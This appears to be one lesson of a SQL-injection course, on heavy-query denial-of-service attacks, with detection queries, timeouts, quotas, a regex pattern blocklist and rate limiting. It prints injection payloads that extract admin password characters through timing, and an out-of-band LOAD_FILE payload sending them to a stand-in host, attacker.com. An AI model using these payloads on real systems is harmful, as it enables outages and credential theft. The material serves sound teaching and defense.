# 15 - Heavy Query DoS Attack

## Overview

Heavy query attacks use resource-intensive SQL operations to cause denial of service. Unlike data extraction attacks, the goal is to overwhelm database resources through CPU, memory, or disk I/O exhaustion.

## Understanding Heavy Queries

Heavy query attacks exploit database functions that consume excessive resources. These queries are syntactically valid but computationally expensive, making them difficult to filter while still causing significant impact.

### Attack Objectives

| Resource     | Attack Method                           | Impact                   |
| ------------ | --------------------------------------- | ------------------------ |
| **CPU**      | Complex calculations, recursive queries | High load, slow response |
| **Memory**   | Large result sets, temporary tables     | Out of memory errors     |
| **Disk I/O** | Sorting, temporary table creation       | Storage exhaustion       |
| **Network**  | Large data transfers                    | Bandwidth saturation     |

## Attack Mechanics

### CPU Exhaustion

**PostgreSQL: Recursive Fibonacci Generation**

```sql
-- Generate 1 million Fibonacci numbers recursively
WITH RECURSIVE fib(n, a, b) AS (
    SELECT 1, 0, 1
    UNION ALL
    SELECT n + 1, b, a + b FROM fib WHERE n < 1000000
)
SELECT * FROM fib;
```

**MySQL: BENCHMARK Function**

```sql
-- Execute MD5 hash 10 million times
SELECT BENCHMARK(10000000, MD5('test'));
```

**MSSQL: Heavy Calculation**

```sql
-- Complex mathematical operations
SELECT COUNT(*) FROM (
    SELECT POWER(CAST(number AS FLOAT), 37)
    FROM master..spt_values
    WHERE type = 'P'
) t;
```

### Memory Exhaustion

**Cross Join Attacks:**

```sql
-- MySQL: Generate massive cross join
SELECT * FROM
    (SELECT 1 UNION SELECT 2 UNION SELECT 3) a,
    (SELECT 1 UNION SELECT 2 UNION SELECT 3) b,
    (SELECT 1 UNION SELECT 2 UNION SELECT 3) c,
    (SELECT 1 UNION SELECT 2 UNION SELECT 3) d,
    (SELECT 1 UNION SELECT 2 UNION SELECT 3) e;
-- Creates 3^5 = 243 rows
-- Scalable: 10^5 = 100,000 rows
```

**PostgreSQL: Large Series Generation**

```sql
-- Generate 10 million rows
SELECT * FROM generate_series(1, 10000000);
```

### Disk I/O Exhaustion

**Temporary Table Creation:**

```sql
-- PostgreSQL: Create massive temporary tables
CREATE TEMP TABLE heavy AS
SELECT generate_series(1, 10000000) as num, md5(random()::text);

-- Sort operations
SELECT * FROM large_table ORDER BY MD5(data);
```

## SQL Injection via Heavy Queries

### Boolean-Based Heavy Query

```sql
-- MySQL BENCHMARK with conditional
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM admin) > 0
       THEN BENCHMARK(10000000, MD5(1))
       ELSE 0 END)--
```

**How it works:**

- If condition is true: BENCHMARK runs (10 second delay)
- If condition is false: Returns immediately

### Time-Based via Heavy Operations

```sql
-- PostgreSQL: Heavy calculation with delay
' AND (SELECT COUNT(*) FROM generate_series(1, 1000000)) > 0
AND PG_SLEEP(5)--
```

### Out-of-Band via Heavy DNS

```sql
-- MySQL: Repeated DNS lookups
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT REPEAT(SUBSTRING(password,1,1), 100) FROM admin LIMIT 1),
    '.attacker.com\\abc'))--
```

## Detection in Applications

### Monitoring Indicators

**Watch for:**

- Sudden CPU spikes in database
- Long-running queries (>30 seconds)
- Increased connection pool exhaustion
- Memory usage patterns
- Abnormal disk I/O activity

### Log Analysis

**PostgreSQL:**

```sql
-- Find long-running queries
SELECT query, query_start, state, NOW() - query_start as duration
FROM pg_stat_activity
WHERE state = 'active'
AND NOW() - query_start > interval '30 seconds';
```

**MySQL:**

```sql
-- Enable slow query log
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 5;
```

**MSSQL:**

```sql
-- Find expensive queries
SELECT TOP 10
    qs.total_elapsed_time/1000 AS duration_ms,
    qs.execution_count,
    SUBSTRING(qt.text, (qs.statement_start_offset/2)+1,
        ((CASE qs.statement_end_offset
            WHEN -1 THEN DATALENGTH(qt.text)
            ELSE qs.statement_end_offset
        END - qs.statement_start_offset)/2) + 1) AS query_text
FROM sys.dm_exec_query_stats qs
CROSS APPLY sys.dm_exec_sql_text(qs.sql_handle) qt
ORDER BY qs.total_elapsed_time DESC;
```

## Prevention

### Query Timeout Limits

**Application Level:**

```php
// PHP PDO
$stmt = $pdo->prepare($query);
$stmt->execute();

// Kill after 5 seconds
$db->query("SET statement_timeout = '5s'");
```

**Database Level:**

```sql
-- PostgreSQL
ALTER DATABASE mydb SET statement_timeout = '5s';

-- MySQL (per session)
SET SESSION MAX_EXECUTION_TIME=5000;

-- MSSQL
EXEC sp_configure 'remote query timeout', 5;
RECONFIGURE;
```

### Resource Quotas

**PostgreSQL:**

```sql
-- Limit work memory per query
ALTER USER webapp SET work_mem = '64MB';

-- Limit temporary file usage
ALTER USER webapp SET temp_file_limit = '1GB';
```

**MySQL:**

```sql
-- Limit per-user resources
GRANT USAGE ON *.* TO 'webapp'@'localhost'
WITH MAX_QUERIES_PER_HOUR 1000
MAX_UPDATES_PER_HOUR 100
MAX_CONNECTIONS_PER_HOUR 50;
```

### Query Complexity Analysis

```python
import re

def check_query_complexity(query):
    """Reject queries with dangerous patterns"""
    dangerous_patterns = [
        r'RECURSIVE.*WITH',           # Recursive CTEs
        r'CROSS JOIN.*CROSS JOIN',     # Multiple cross joins
        r'GENERATE_SERIES.*1000000',    # Large series generation
        r'BENCHMARK\s*\(\s*\d{7,}',     # Benchmark with large count
        r'UNION.*SELECT.*FROM.*\(.*SELECT',  # Nested subqueries
        r'GROUP BY.*ORDER BY.*LIMIT',   # Complex sorting
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, query, re.IGNORECASE):
            raise ValueError(f"Query too complex: {pattern}")

    return True
```

### Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(
    key_func=lambda: request.remote_addr,
    default_limits=["100 per minute"]
)

@app.route('/api/search')
@limiter.limit("10 per minute")
def search():
    # Search endpoint
    pass
```

## Practice Exercises

### Exercise 1: BENCHMARK Detection

**Task:** Use BENCHMARK function to detect blind SQL injection with time delays.

**Payload:**

```sql
' AND BENCHMARK(1000000, MD5('test'))--
```

### Exercise 2: Heavy Query Boolean

**Task:** Create a heavy query that acts as boolean indicator.

**Payload:**

```sql
' AND (SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM admin)='a'
       THEN BENCHMARK(5000000, SHA1(1))
       ELSE 0 END)--
```

### Exercise 3: Resource Limit Testing

**Task:** Test query timeouts and resource limits in a controlled environment.

**Test Query:**

```sql
-- This should be killed after timeout
WITH RECURSIVE t AS (
    SELECT 1 AS n
    UNION ALL
    SELECT n + 1 FROM t WHERE n < 100000000
)
SELECT * FROM t;
```

## Key Takeaways

1. **Heavy queries cause DoS** without traditional data theft
2. **Resource exhaustion** can be more damaging than data breach
3. **BENCHMARK and recursive CTEs** are common attack vectors
4. **Query timeouts** are essential defense
5. **Resource quotas** limit blast radius

## Next Step

Continue to [16 - JWT SQL Injection](16-JWT-SQL-Injection.md) to learn about token-based attacks.
